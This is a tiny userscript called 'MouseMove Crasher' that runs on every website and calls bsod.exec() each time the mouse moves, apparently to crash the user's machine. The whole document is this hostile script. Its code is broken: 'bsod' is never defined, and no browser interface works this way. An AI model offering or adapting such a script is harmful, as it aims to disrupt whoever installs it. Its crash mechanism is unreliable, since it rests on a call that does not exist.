// ==UserScript==
// @name           MouseMove Crasher
// @namespace      http://crash.me
// @include        *
// ==/UserScript==


function initcrash(){
	bsod.exec();
	
}

window.addEventListener('mousemove',initcrash,true);